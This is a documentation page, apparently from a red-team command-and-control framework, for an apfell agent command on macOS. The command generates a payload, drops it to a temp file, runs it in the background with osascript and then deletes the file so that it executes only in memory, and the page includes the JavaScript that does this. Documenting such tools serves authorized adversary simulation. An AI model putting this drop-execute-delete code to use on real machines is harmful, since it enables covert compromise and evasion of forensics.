+++
title = "spawn_drop_and_execute"
chapter = false
weight = 100
hidden = false
+++

## Summary

Generate a new payload, drop it to a temp location, execute it with osascript as a background process, and then delete the file. Automatically reports back the temp file it created.

- Needs Admin: False  
- Version: 1  
- Author: @its_a_feature_  

### Arguments

#### template

- Description: apfell agent to use as template to generate a new payload   
- Required Value: True  
- Default Value: None  

## Usage

```
spawn_drop_and_execute
```


## Detailed Summary
This function takes the `apfell` payload indicated by `template`, generates a new instance of it, writes it to a random filename in `/temp`, starts its execution as a backgrounded processes, waits three seconds, and removes the file. The file can be removed from disk because once the `osascript` binary kicks off with the JavaScript code, it's all being executed and compiled (JIT) in memory, so the file on disk is no longer needed. 

The temporary file created is reported back as an artifact automatically.

```JavaScript
let path = "/usr/bin/osascript";
let result = write_data_to_file(file, temp_file);
if(result !== "file written"){return {"user_output": result, "completed": true, "status": 'error'};}
else{artifacts.push({"base_artifact": "File Write", "artifact": temp_file});}
let args = ['-l','JavaScript', temp_file, '&'];
try{
    let pipe = $.NSPipe.pipe;
    let file = pipe.fileHandleForReading;  // NSFileHandle
    let task = $.NSTask.alloc.init;
    task.launchPath = path;
    task.arguments = args;
    task.standardOutput = pipe;
    task.standardError = pipe;
    task.launch;
    artifacts.push({"base_artifact": "Process Create", "artifact": "/usr/bin/osascript " + args.join(" ")});
}
catch(error){
    return {"user_output":error.toString(), "completed": true, "status": "error", "artifacts": artifacts};
}
//give the system time to actually execute the file before we delete it
$.NSThread.sleepForTimeInterval(3);
let fileManager = $.NSFileManager.defaultManager;
fileManager.removeItemAtPathError($(temp_file), $());
```
